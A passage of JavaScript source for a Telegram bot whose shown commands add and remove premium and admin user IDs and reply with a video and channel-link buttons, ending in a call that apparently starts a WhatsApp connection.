                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "https://t.me/MRMOTUPATLUCHAT"
                                                           }]
                                           ]
                                   }
                           });
                   }
           });
           bot.onText(/\/dellprem(?:\s(.+))?/, (msg, match) => {
                   const chatId = msg.chat.id;
                   const senderId = msg.from.id;
                   if (!premiumUsers.includes(senderId) && !adminUsers.includes(senderId)) {
                           return bot.sendMessage(chatId, "[ ! ] NOT ADD PREMIUM USER ANOMALI");
                   }
                   if (!match[1]) {
                           return bot.sendMessage(chatId, "[ ! ] - EXAMPLE : DELLPREM ID - [ 💫𓆩 𝙅𝘼𝙄 𝙎𝙃𝙍𝘌𝘌 𝙍𝘼𝙈 💜 𓆪💫 ] 🦠");
                   }
                   const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
                   if (premiumUsers.includes(userId)) {
                           premiumUsers = premiumUsers.filter(id => id !== userId);
                           savePremiumUsers();
                           bot.sendVideo(chatId, "https://files.catbox.moe/xli3xw.mp4", {
                                   caption: `</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝘿𝙚𝙡𝙡 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝙐𝙨𝙚𝙧 🐉`,
                                   reply_markup: {
                                           inline_keyboard: [
                                                           [{
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "https://t.me/MRMOTUPATLUCHAT"
                                                           }, {
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }],
                                                           [{
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "t.me/MOTU_PATALU_HINDU_HAI"
                                                           }]
                                           ]
                                   }
                           });
                   }
           });
           bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
                   const chatId = msg.chat.id;
                   const senderId = msg.from.id;
                   if (!owner.includes(senderId)) {
                           return bot.sendMessage(chatId, "[ ! ] NOT ADD ADMIN USER ANOMALI");
                   }
                   if (!match[1]) {
                           return bot.sendMessage(chatId, "[ ! ] - EXAMPLE : ADDADMIN ID - [ 💫𓆩 𝙅𝘼𝙄 𝙎𝙃𝙍𝘌𝘌 𝙍𝘼𝙈 💜 𓆪💫 ] 🦠");
                   }
                   const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
                   if (!/^\d+$/.test(userId)) {
                           return bot.sendMessage(chatId, "[ ! ] SERTAKAN ID USER");
                   }
                   if (!adminUsers.includes(userId)) {
                           adminUsers.push(userId);
                           saveAdminUsers();
                           bot.sendVideo(chatId, "https://files.catbox.moe/xli3xw.mp4", {
                                   caption: `</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝘼𝙙𝙙 𝘼𝙙𝙢𝙞𝙣 𝙐𝙨𝙚𝙧 🐉`,
                                   reply_markup: {
                                           inline_keyboard: [
                                                           [{
                                                                   text: "⟠「 𝙏𝘌𝙇𝘌𝘎𝙍𝘼𝙈𝙑3.0 」⟠",
                                                                   url: "https://t.me/MRMOTUPATLUCHAT"
                                                           }, {
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "https://t.me/MRMOTUPATLUCHAT"
                                                           }],
                                                           [{
                                                                   text: "⟠「 𝙈𝙊𝙏𝙐 𝙋𝘼𝙏𝙇𝙐 」⟠",
                                                                   url: "https://t.me/MRMOTUPATLUCHAT"
                                                           }]
                                           ]
                                   }
                           });
                   }
           });
           bot.onText(/\/delladmin(?:\s(.+))?/, (msg, match) => {
                   const chatId = msg.chat.id;
                   const senderId = msg.from.id;
                   if (!owner.includes(senderId)) {
                           return bot.sendMessage(chatId, "[ ! ] NOT ADD ADMIN USER ANOMALI");
                   }
                   if (!match[1]) {
                           return bot.sendMessage(chatId, "[ ! ] - EXAMPLE : DELL ID - [ SUPPORT ] 🦠");
                   }
                   const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
                   if (adminUsers.includes(userId)) {
                           adminUsers = adminUsers.filter(id => id !== userId);
                           saveAdminUsers();
                           bot.sendVideo(chatId, "https://files.catbox.moe/xli3xw.mp4", {
                                   caption: `</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝘿𝙚𝙡𝙡 𝘼𝙙𝙢𝙞𝙣 𝙐𝙨𝙚𝙧 🐉`,
                                   reply_markup: {
                                           inline_keyboard: [
                                                           [{
                                                                   text: "⟠「 𝐘𝐎𝐔𝐓𝐔𝐁𝐄 」⟠",
                                                                   url: "https://www.youtube.com/@MR_MOTU_PATLUBY"
                                                           }, {
                                                                   text: "⟠「 𝙏𝘌𝙇𝘌𝘎𝙍𝘼𝙈𝙑3.0 」⟠",
                                                                   url: "https://www.youtube.com/@MR_MOTU_PATLUBY"
                                                           }],
                                                           [{
                                                                   text: "⟠「 💫𓆩 𝙅𝘼𝙄 𝙎𝙃𝙍𝘌𝘌 𝙍𝘼𝙈 💜 𓆪💫 」⟠",
                                                                   url: "https://www.youtube.com/@MR_MOTU_PATLUBY"
                                                           }]
                                           ]
                                   }
                           });
                   }
           });
           startWhatsapp()